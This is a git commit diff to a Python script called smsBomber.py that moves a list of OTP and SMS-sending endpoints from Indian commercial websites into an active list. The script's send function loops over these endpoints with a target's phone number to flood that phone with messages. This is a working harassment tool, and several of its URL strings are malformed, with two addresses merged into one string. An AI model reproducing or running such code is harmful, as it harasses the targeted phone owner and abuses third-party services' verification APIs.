1cb30eaa6cd649dd64b7c951bda8b2ec1bf9af1f
harshkc <harsh.hkc1006@gmail.com>
2019-10-03 01:02:15 +0530

    Fixed all bugs alpha build

--- smsBomber.py
+++ smsBomber.py
@@ -12,12 +12,11 @@ def banner():
         os.system("cls")
     else:
         os.system("clear")
-    print(" BOMBER ")
+    print(" SMS BOMBER ")
 
-#"https://myaccount.sulekha.com/network/userauthv1.aspx?mode=sendvcode&mobilenumber=","https://www.justdial.com/functions/ajxandroid.php","https://m.naaptol.com/faces/jsp/ajax/ajax.jsp?actionname=checkMobileUserExists&mobile=","http://www.spencers.in/genOtp/genOTP.php?action=genOTP&phone=","http://api.im.hike.in/v3/account/validate?digits=4","https://www.flipkart.com/api/6/user/signup/status","https://appapi.mobikwik.com/p/account/otp/cell","http://www.narendramodi.in/site/senddnldlink?contact_no=91%C2%A0","https://www.tatadocomo.com/INonRender/Personal_MydocomoApp/GenerateOTP?mobile=","https://myaccount.paisabazaar.com/my-account/","https://www.iffcobazar.in/login_otp.html","https://www.netmeds.com/sociallogin/popup/checkmobileno/","https://www.snapdeal.com/sendOTP"
 
 def send(num, counter, slep):
-    url1 = ["https://securedapi.confirmtkt.com/api/platform/register?mobileNumber=","https://www.goibibo.com/common/downloadsms/"]
+    url1 = ["https://securedapi.confirmtkt.com/api/platform/register?mobileNumber=","https://www.goibibo.com/common/downloadsms/,https://myaccount.sulekha.com/network/userauthv1.aspx?mode=sendvcode&mobilenumber=","https://www.justdial.com/functions/ajxandroid.php","https://m.naaptol.com/faces/jsp/ajax/ajax.jsp?actionname=checkMobileUserExists&mobile=","http://www.spencers.in/genOtp/genOTP.php?action=genOTP&phone=","http://api.im.hike.in/v3/account/validate?digits=4","https://www.flipkart.com/api/6/user/signup/status","https://appapi.mobikwik.com/p/account/otp/cell","http://www.narendramodi.in/site/senddnldlink?contact_no=91%C2%A0","https://www.tatadocomo.com/INonRender/Personal_MydocomoApp/GenerateOTP?mobile=","https://myaccount.paisabazaar.com/my-account/","https://www.iffcobazar.in/login_otp.html,https://www.netmeds.com/sociallogin/popup/checkmobileno/" , "https://www.snapdeal.com/sendOTP"]
     data={"phone":num}
     x=y=0
     for y in range(int(counter)):
